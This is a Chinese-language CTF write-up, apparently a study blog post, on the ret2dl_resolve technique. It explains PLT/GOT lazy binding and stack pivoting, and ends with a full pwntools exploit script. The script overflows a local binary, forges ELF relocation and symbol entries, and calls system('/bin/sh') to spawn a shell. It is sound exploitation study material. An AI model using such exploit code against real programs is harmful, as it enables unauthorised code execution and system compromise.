---
title: ret2dlrsvl
date: 2018-08-28 00:00:00
categories:
- CTF/Pwn
tags:  Pwn
---
# ret2dl_resolve 学习



补习了一下栈的知识，看了一下最难的利用方式，发现还是有好多要学习的地方
ret2dlresolve主要就是在没有libc的时候，利用动态延迟绑定来进行利用的一种手法
总体来说比较麻烦，需要阅读源码理解
这里写一下总体的思路
首先程序调用系统函数的时候调用系统函数时先找plt，plt里面有一个偏移的index，之后跳到got表中执行，在这里会进行一堆操作，而且参数是基于栈传递的，这就说明如果我们控制了栈内的参数就可以在调用系统函数时做文章
这里贴一个参考[链接][1]


漏洞利用方式主要就是：
1.控制eip为PLT[0]的地址，只需传递一个index_arg参数
2.控制index_arg的大小，使reloc的位置落在可控地址内
3.伪造reloc的内容，使sym落在可控地址内
4.伪造sym的内容，使name落在可控地址内
5.伪造name为任意库函数，如system
源程序里栈的溢出字节很小，所以不能把整个payload写进去
```
    ssize_t vuln()
    {
      char buf; // [esp+Ch] [ebp-6Ch]
    
      setbuf(stdin, &buf);
      return read(0, &buf, 0x100u);
    }
```
这里只能溢出0x30字节，所以需要栈转移（stack pivot）这一手法
目的是将栈地址搞到一个可控的地址去，一般是堆或者bss段，涉及到的指令（gadget）是pop ebp ret以及 leave ret（pop esp当然也可以，不过很难找）
leave这一指令作用就是：mov esp ebp；pop ebp
pop ebp之后在执行leave就实现栈转移了
而后就是设置一堆字段的值
首先我们要知道plt[0]的地址，在ida里面看到前缀.plt那里就是plt的地址
而后需要知道rel.plt的地址，在ida里面找到ELF JMPREL Relocation Table
之后是dynsym（ELF Symbol Table）以及dynstr（ELF String Table）
有了这些地址之后就可以构造伪造的地址以及一些dl-runtime的参数
在构造的时候注意一些字段需要对齐
具体的构造方式见exp
exp：
```python
    from pwn import *
    context.log_level = 'debug'
    io = process('./bof')
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    elf = ELF('bof')
    
    write_got = elf.got['write']
    read_got = elf.got['read']
    write_plt = elf.plt['write']
    read_plt = elf.plt['read']
    pop_esi_edi_ebp_ret = 0x08048619
    pop_ebp_ret = 0x0804861b
    leave_ret = 0x08048458  #mov esp ebp
    						#pop ebp
    bss = 0x804A040
    stack = 0x800
    stack_base = bss + stack
    
    io.recvline()
    
    payload = 'A' * 0x70
    payload += p32(read_plt)
    payload += p32(pop_esi_edi_ebp_ret)
    payload += p32(0)
    payload += p32(stack_base)
    payload += p32(100)
    payload += p32(pop_ebp_ret)
    payload += p32(stack_base)
    payload += p32(leave_ret)
    io.sendline(payload)
    
    plt_0 = 0x8048380
    #write_offset = 0x20	# ida .plt:0x80483D6
    rel_plt = 0x8048330	# ida  ELF JMPREL Relocation Table
    				   	# objdump -s -j .rel.plt bof
    index_offset = (stack_base + 28) -rel_plt
    					#fake reloc now in stack_base + 28
    #r_info = 0x607		#ida  ELF JMPREL Relocation Table
    dynsym = 0x80481D8	# ELF Symbol Table
    dynstr = 0x8048278	# ELF String Table
    fake_sym_addr = stack_base + 36
    align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
    fake_sym_addr = fake_sym_addr + align
    index_dynsym = (fake_sym_addr - dynsym) / 0x10
    r_info = (index_dynsym << 8) | 0x7
    fake_reloc = p32(write_got)+p32(r_info)
    st_name = (fake_sym_addr + 0x10) - dynstr	#0x10 is len(fake_sym)
    					#  ELF Symbol Table shift + e
    fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12) 
    cmd = '/bin/sh'
    
    payload2 = 'AAAA' #ebp
    payload2 += p32(plt_0)
    payload2 += p32(index_offset)
    payload2 += 'AAAA'#ret addr
    #payload2 += p32(1)
    payload2 += p32(stack_base+80)
    payload2 += 'aaaa'
    payload2 += 'aaaa'
    #payload2 += p32(len(cmd))
    payload2 += fake_reloc
    payload2 += 'B'	* align
    payload2 += fake_sym
    payload2 += 'system\x00'
    payload2 += 'A' * (80 - len(payload2))
    payload2 += cmd + '\x00'
    payload2 += 'A' * (100 - len(payload2))
    io.sendline(payload2)
    
    io.interactive()
```
[参考链接][2]


  [1]: http://www.inforsec.org/wp/?p=389
  [2]: http://pwn4.fun/2016/11/09/Return-to-dl-resolve/